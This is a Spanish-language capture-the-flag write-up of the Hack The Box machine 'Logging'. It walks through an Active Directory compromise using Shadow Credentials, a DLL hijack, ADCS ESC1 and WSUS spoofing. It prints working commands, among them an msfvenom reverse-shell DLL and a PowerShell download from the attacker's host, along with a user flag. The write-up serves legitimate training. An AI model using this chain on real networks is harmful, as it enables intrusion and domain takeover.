Revshell estable · Logging

HTB Windows Medium — Shadow Credentials → DLL Hijack → ADCS ESC1 → WSUS 845 XP

Objetivo: Obtener revshell estable y ambas flags en la máquina Logging de Hack The Box. Este write-up documenta el proceso completo de enumeración, explotación y escalada de privilegios.

Política de Redacción: Los hashes NT, contraseñas y datos sensibles han sido redactados por cumplir con las políticas de HTB y buenas prácticas de seguridad.

1. Enumeración inicial

Tras desplegar la máquina, se realizó un escaneo de puertos con nmap y se obtuvieron las siguientes credenciales iniciales proporcionadas por el reto.

RecursoValorEstado
IP 10.129.245.130 ACTIVA
Dominio logging.htb OK
DC dc01.logging.htb OK
Usuario inicial wallace.everette Sesión inestable
Contraseña REDACTED Restringida

El usuario wallace.everette otorgaba acceso a SMB, pero la sesión por WinRM era inestable. Se procedió a enumerar los recursos compartidos.

2. Enumeración SMB

Se listaron los recursos SMB y se encontró el share Logs, accesible con las credenciales de wallace.everette. 

# Conexión al share
smbclient //logging.htb/Logs -U wallace.everette%********
# Archivos relevantes
Audit_Heartbeat.log
IdentitySync_Trace_20260219.log
Service_State.log
TaskMonitor.log
Hallazgo crítico: En IdentitySync_Trace_20260219.log se encontraron las credenciales de la cuenta svc_recovery, que posteriormente sería clave para el ataque de Shadow Credentials.

3. Shadow Credentials → msa_health$

Mediante BloodHound se determinó que svc_recovery tenía GenericWrite sobre la cuenta msa_health$. Se utilizó Certipy con autenticación Kerberos para realizar el ataque de Shadow Credentials.

bash 
# Obtener TGT de svc_recovery
python3 getTGT.py logging.htb/svc_recovery:******** -dc-ip 10.129.245.130

# Exportar ticket y ejecutar Shadow Credentials
export KRB5CCNAME=svc_recovery.ccache
certipy shadow auto -u svc_recovery@logging.htb -k -account msa_health$ -dc-ip 10.129.245.130 -target dc01.logging.htb
Éxito: Se obtuvo el hash NT de msa_health$. NT Hash: [REDACTED]

4. WinRM como msa_health$

Con el hash NT de msa_health$ se estableció una sesión estable mediante Evil-WinRM.

bash 
evil-winrm -i 10.129.245.130 -u msa_health$ -H [REDACTED]

5. DLL Hijack → jaylee.clifton

Se identificó la tarea programada UpdateMonitor que se ejecutaba cada 3 minutos como el usuario jaylee.clifton. Se preparó un payload DLL con msfvenom y se colocó en C:\ProgramData\UpdateMonitor\Settings_Update.zip.

bash 
# Crear payload DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.154 LPORT=4445 -a x86 --platform windows -f dll -o settings_update.dll
zip Settings_Update.zip settings_update.dll

# Subir a la máquina víctima (desde evil-winrm)
(New-Object System.Net.WebClient).DownloadFile("http://10.10.15.154:8080/Settings_Update.zip", "C:\ProgramData\UpdateMonitor\Settings_Update.zip")
Shell obtenida: Tras esperar ~3 minutos, se recibió la reverse shell como jaylee.clifton en el puerto 4445.

6. User Flag

Desde la shell de jaylee.clifton se leyó la flag de usuario:

cmd 
whoami
logging\jaylee.clifton

type C:\Users\jaylee.clifton\Desktop\user.txt

User Flag: 8f167f22b6cec1982406a8f32dfd32d2

7. ADCS ESC1 → Certificado WSUS

Con la shell de jaylee.clifton se utilizó Rubeus para obtener el TGT y posteriormente solicitar un certificado con el template UpdateSrv para el DNS wsus.logging.htb.

cmd 
C:\temp\Rubeus.exe tgtdeleg /nowrap
# (se copia el base64 del ticket a Kali)
bash 
# Convertir ticket y solicitar certificado
impacket-ticketConverter jaylee.kirbi jaylee.ccache
export KRB5CCNAME=jaylee.ccache
certipy req -u jaylee.clifton@logging.htb -k -no-pass -target dc01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb -dc-ip 10.129.245.130

8. WSUS Spoofing → SYSTEM

Con el certificado obtenido, se montó un servidor WSUS falso en Kali y se envenenó el DNS para redirigir wsus.logging.htb a nuestra IP. Se forzó la actualización del cliente WSUS con wuauclt.exe y se ejecutó un comando como SYSTEM.

Root Flag: Se obtuvo acceso con privilegios NT AUTHORITY\SYSTEM y se leyó la flag root.

Lección aprendida: La combinación de Shadow Credentials, DLL Hijack y ADCS ESC1 permitió escalar desde un usuario con acceso restringido hasta privilegios de SYSTEM. El ataque a WSUS demostró que incluso servicios aparentemente seguros pueden ser explotados si se cuenta con los certificados adecuados.
